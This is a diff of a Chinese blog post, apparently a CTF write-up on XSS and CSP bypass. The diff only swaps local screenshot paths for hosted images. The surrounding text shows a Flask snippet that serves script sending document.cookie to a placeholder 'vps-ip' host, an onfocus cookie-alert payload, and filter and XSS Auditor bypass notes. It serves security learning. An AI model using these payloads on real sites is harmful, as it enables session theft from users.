@@ -43,14 +43,14 @@
 <meta property="og:site_name" content="glotozz&#39;blog">
 <meta property="og:description" content="从几道题学习XSS以及一些相关绕过姿势">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-27_12-56-43.png">
-<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-27_14-19-15.png">
-<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-27_14-31-55.png">
-<meta property="og:updated_time" content="2020-02-27T07:49:23.503Z">
+<meta property="og:image" content="https://i.loli.net/2020/02/27/KIdhCn8NF4uSGU7.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/27/6E5zqaNeoQOD8m1.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/27/mH7sSqa32MnTgQk.png">
+<meta property="og:updated_time" content="2020-02-27T08:12:33.249Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS&amp;bypass CSP">
 <meta name="twitter:description" content="从几道题学习XSS以及一些相关绕过姿势">
-<meta name="twitter:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-27_12-56-43.png">
+<meta name="twitter:image" content="https://i.loli.net/2020/02/27/KIdhCn8NF4uSGU7.png">
 
 
 <link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1">
@@ -163,7 +163,8 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">	response = make_response(<span class="string">"&lt;script&gt;window.open('http://vps-ip/'+document.cookie)&lt;/script&gt;"</span>)</span><br><span class="line">	response.headers[<span class="string">'Access-Control-Allow-Origin'</span>] = <span class="string">'*'</span></span><br><span class="line">	<span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	app.run(host=<span class="string">"0.0.0.0"</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
 
 <p>本地测试</p>
-<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-27_12-56-43.png" alt="Snipaste_2020-02-27_12-56-43"></p>
+<img src="https://i.loli.net/2020/02/27/KIdhCn8NF4uSGU7.png" alt="Snipaste_2020-02-27_12-56-43.png" style="zoom:67%;">
+
 <hr>
 <h4 id="hgame-Comcos聊天室2"><a href="#hgame-Comcos聊天室2" class="headerlink" title="hgame-Comcos聊天室2"></a>hgame-Comcos聊天室2</h4><p>将<code>script</code>替换为空，双写绕过，但是出现报错</p>
 <blockquote>
@@ -187,7 +188,8 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onfocus=&quot;alert(document.cookie)&quot; id=&quot;1&quot; tabindex=&quot;0&quot;&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>
 
 <p>chrome测试成功</p>
-<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-27_14-19-15.png" alt="Snipaste_2020-02-27_14-19-15"></p>
+<img src="https://i.loli.net/2020/02/27/6E5zqaNeoQOD8m1.png" alt="Snipaste_2020-02-27_14-19-15.png" style="zoom:67%;">
+
 <p>之后常规打cookie即可</p>
 <hr>
 <h4 id="RealWorld-CTF2019-Hcorme"><a href="#RealWorld-CTF2019-Hcorme" class="headerlink" title="RealWorld CTF2019-Hcorme"></a>RealWorld CTF2019-Hcorme</h4><blockquote>
@@ -198,7 +200,8 @@
 <blockquote>
 <p>因为在UTF-16文件的开首，都会放置一个U+FEFF字符作为Byte Order Mark（UTF-16LE以FF FE代表，UTF-16BE以FE FF代表），以显示这个文本文件是以UTF-16编码，它是个没有宽度也没有断字的空白。 </p>
 </blockquote>
-<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-27_14-31-55.png" alt="Snipaste_2020-02-27_14-31-55"></p>
+<img src="https://i.loli.net/2020/02/27/mH7sSqa32MnTgQk.png" alt="Snipaste_2020-02-27_14-31-55.png" style="zoom:67%;">
+
 <p>猜测是类似截断的原理，从而bypass XSS Auditor</p>
 <blockquote>
 <p>绕过CSP，是利用JSONP直接把js代码挂载到本地的<code>script</code></p>
